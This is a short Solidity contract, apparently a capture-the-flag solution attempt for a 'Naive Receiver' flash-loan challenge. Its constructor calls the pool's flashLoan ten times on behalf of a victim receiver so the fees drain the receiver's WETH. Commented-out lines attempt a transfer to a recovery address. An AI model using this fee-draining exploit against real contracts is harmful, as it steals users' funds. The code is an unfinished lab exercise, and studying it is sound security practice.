// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Test, console} from "forge-std/Test.sol";


contract NaiveAttacker {
    constructor(address poolAddress, IERC3156FlashBorrower  receiver, address recovery) {
        for (uint256 i = 0; i <= 9; i++) {
            NaiveReceiverPool(poolAddress).flashLoan(receiver, address(NaiveReceiverPool(poolAddress).weth()), 0,"");
        }
    //     console.log('BEFORE TRANSFERFROM: ' );
         uint256 poolBalance = WETH(NaiveReceiverPool(poolAddress).weth()).balanceOf(poolAddress);  
        console.log('poolBalance: ', poolBalance);
        
    //     console.log('poolAddress: ', poolAddress);
    //     WETH(NaiveReceiverPool(poolAddress).weth()).approve(recovery, 1);
    //     WETH(NaiveReceiverPool(poolAddress).weth()).transferFrom(poolAddress, recovery, 1);
    }
}